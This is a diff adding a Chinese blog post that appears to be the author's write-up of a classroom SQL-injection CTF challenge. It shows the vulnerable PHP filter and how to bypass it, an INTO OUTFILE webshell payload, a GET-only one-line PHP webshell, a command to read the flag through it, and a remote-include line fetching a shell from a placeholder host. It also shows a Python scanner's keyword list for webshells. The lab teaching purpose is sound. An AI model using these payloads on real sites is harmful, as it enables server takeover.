@@ -148,6 +148,205 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-sql第三题write-up" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/10/18/sql第三题write-up/">sql第三题write_up</a>
+    </h1>
+  
+
+        
+        <a href="/2017/10/18/sql第三题write-up/" class="archive-article-date">
+  	<time datetime="2017-10-17T16:54:06.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-10-18</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>##第三题Write Up<br>&emsp;这次的第三题主要是想练习一下班上同学以下三点知识：</p>
+<blockquote>
+<ul>
+<li>代码审计</li>
+<li>sql注入shell的写入</li>
+<li>对一句话木马的理解</li>
+</ul>
+</blockquote>
+<p>过滤文件filter.php的代码如下：</p>
+<pre><code>&lt;?php
+
+function filter($input){
+    while(preg_match(&apos;/(and|or|union|where|limit|group by|select|hex|substr)/i&apos;,$input)){
+        $input=preg_replace(&apos;/(and|or|union|where|limit|group by|select|hex|substr)/i&apos;,&apos;&apos;,$input);
+    }
+    $array=array(&quot;*&quot;,&quot; &quot;,&quot;-&quot;,&quot;0x&quot;);
+    foreach($array as $str){
+        $input=str_replace($str,&quot;&quot;,$input);
+    }
+    return $input;
+}
+
+function filter_add($input){
+    $filter=preg_match(&apos;/(select.*into)|(limit [0-9]+,[0-9]+)/i&apos;,$input);
+    if($filter){
+        die(&quot;&lt;script&gt;alert(\&quot;emmmm...want to have a webshell?.\&quot;)&lt;/script&gt;&quot;);
+    }
+}
+
+function filter_admin($input){
+    preg_match(&quot;/^[_0-9a-z]{4,25}$/i&quot;,$input) or die(&quot;&lt;script&gt;alert(\&quot;Emmmmm...Your input is out of range or containing illegal parameter.\&quot;)&lt;/script&gt;&quot;);
+}
+?&gt;
+</code></pre><p>在filter函数中，敏感字符串和特殊符号分开进行了过滤，先检查敏感字符串再替换特殊符号为空，仔细思考会发现其存在逻辑漏洞，可以在敏感字符串中插入特殊字符绕过敏感字符串检测，过滤特殊字符后变成正常语句，空格过滤可以用%0a、反引号或者\n绕过，然后就可以进行正常的注入爆数据等，爆出管理员账号密码，密码是多次base64加密的密文，python脚本跑一遍就能得到明文。登陆取得一半flag。</p>
+<p>另一半需写入shell在上级目录读文件获得，在这里用正则过滤了“select into outfile”写shell的方式，但是正则写得不对……被大佬用\n和%0a绕过，这里本来是想让大家了解一下利用“terminated by”写shell的方式，在sqlmap目录下有个写shell的payload：</p>
+<pre><code>LIMIT 0,1 INTO OUTFILE &apos;%OUTFILE%&apos; LINES TERMINATED BY 0x%HEXSTRING%--
+</code></pre><p>与前者稍微不同的是，这个是在查询出数据后在数据中插入我们的一句话木马，因此写shell时前面需能正确查询一条或多条数据，具体可看这篇文章：<a href="http://www.cnblogs.com/qing123/p/6771858.html" target="_blank" rel="external">http://www.cnblogs.com/qing123/p/6771858.html</a></p>
+<p>在后台有一个python脚本会扫生成的shell文件并检测其中的敏感字符串<br>代码如下：</p>
+<pre><code>import os
+
+import re
+
+import time
+
+
+
+dir_list=[&quot;admin.php&quot;,&quot;index.php&quot;,&quot;sql&quot;,&quot;filter.php&quot;,&quot;filter.php.bak&quot;]
+
+dir_list2=[&quot;sql-con-1.php&quot;,&quot;sql-con-2.php&quot;,&quot;sql-con-3.php&quot;]
+
+str=&quot;emmmm,your shell is detected&quot;
+
+
+
+while(1):
+
+    dir=os.listdir(&quot;html/&quot;)
+
+    if len(dir) != len(dir_list):
+
+        for i in dir:
+
+            if i not in dir_list:
+
+                if os.path.isfile(&quot;html/%s&quot; % i):
+
+            dir_list.append(i)
+                    file=open(&quot;html/%s&quot; % i,&apos;r&apos;)
+
+                    try:
+
+                        content=file.read()
+
+                        content=content.lower()
+                        result=re.search(&quot;eval|assert|post|include|require|;&quot;,content)
+
+                        if result != None:
+
+                            print(&apos;shell found&apos;)
+
+                            file.close()
+
+                            file=open(&quot;html/%s&quot; % i,&apos;w&apos;)
+
+                            file.write(str)
+
+                    finally:
+
+                        file.close()
+
+            elif os.path.isdir(&quot;html/%s&quot; % i):
+
+                dir2=os.listdir(&quot;html/%s/&quot; % i)
+
+                for j in dir2:
+
+                    if j not in dir_list2:
+
+                        file = open(&quot;html/%s/%s&quot; % (i,j), &apos;r&apos;)
+
+                        try:
+
+                            content = file.read()
+
+                content=content.lower()
+                            result = re.search(&quot;eval|assert|include|post|require|;&quot;, content)
+
+                            if result != None:
+                print(&apos;shell found&apos;)
+
+                                file.close()
+
+                                file = open(&quot;html/%s/%s&quot; % (i,j), &apos;w&apos;)
+
+                                file.write(str)
+
+                        finally:
+
+                            file.close()
+
+    time.sleep(5)
+</code></pre><p>过滤了eval、assert、post，等关键词，以及分号，同学可以写入免杀且隐蔽的一句话，然后因为检测脚本会sleep 5s，因此也可以通过脚本或者burp在被遍历修改前访问到，想要同学们熟悉的是只有$_GET的shell：</p>
+<pre><code>&lt;?php $_GET[a]($_GET[b])?&gt;
+</code></pre><p>当a=assert时，后面可以执行一句话php代码，因此可以url传参a=assert&amp;b=system(‘cat ../flag.txt’)的方式读到flag，通过拿到第二题后wget或者第三题用load_file可以读到admin源码，可以发现我把密码加密函数文件放到了另外一台docker容器中，并通过远程包含的方式包含include进来：</p>
+<pre><code>include_once(&quot;http://172.17.0.3/level3/flag.php&quot;)
+</code></pre><p>可推测配置中allow_url_include=On，因此可以通过a=assert&amp;b=include(“<a href="http://xxxxx/shell.php" target="_blank" rel="external">http://xxxxx/shell.php</a>“)的方式拿到shell，这也是我在检测脚本中加入include和require检测的原因，避免直接包含了加密文件</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">write_up</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2017/10/18/sql第三题write-up/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-file-upload-basic" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -609,6 +808,10 @@ MathJax.Hub.Queue(function() {
             <input type="checkbox" q-on="click:toggleTag(e)" q-attr="checked:showTags">
           </label>
           <ul class="article-tag-list" q-show="showTags">
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">write_up</a>
+              </li>
             
             <div class="clearfix"></div>
           </ul>
